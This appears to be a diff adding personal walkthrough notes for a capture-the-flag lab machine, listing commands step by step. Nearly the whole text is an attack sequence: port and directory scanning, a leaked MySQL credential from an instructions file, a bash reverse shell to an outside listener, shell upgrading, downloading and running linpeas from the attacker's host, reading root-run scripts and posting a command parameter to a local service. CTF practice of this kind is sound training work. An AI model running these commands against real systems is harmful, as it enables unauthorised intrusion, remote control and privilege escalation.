@@ -1,0 +1,31 @@
+nmap -T4 -sC -sV <iIP> (port 80http, 3306mysql, 4444krb524?, 5000upnp? open)
+gobuster dir -u  10.10.31.5 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt,.html,.php (/.html,/.php
+
+/instruvtions.txt => #Steps
+- Create a mysql user (runcheck:CTF_script_cave_changeme)
+- Change necessary lines of config.php file
+Done you can start using ctf script
+
+bash -c "bash -i >& /dev/tcp/10.9.212.64/4242 0>&1"
+nc -nvlp 4242 
+whoami
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+stty raw echo;fg
+cd /home
+ls -la
+cd /dev/shm/
+ python3 -m http.server
+wget 10.9.212.64:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh | tee log
+cd /var/backups/
+ls -la
+cd .script/
+cat ssh.py
+cat runasroot.py
+cd /proct
+cd pass
+cat bcrypt_encryption.py
+curl localhost 
+curl -d "password=rockyou&cmdtype=lsla" localhost:8080
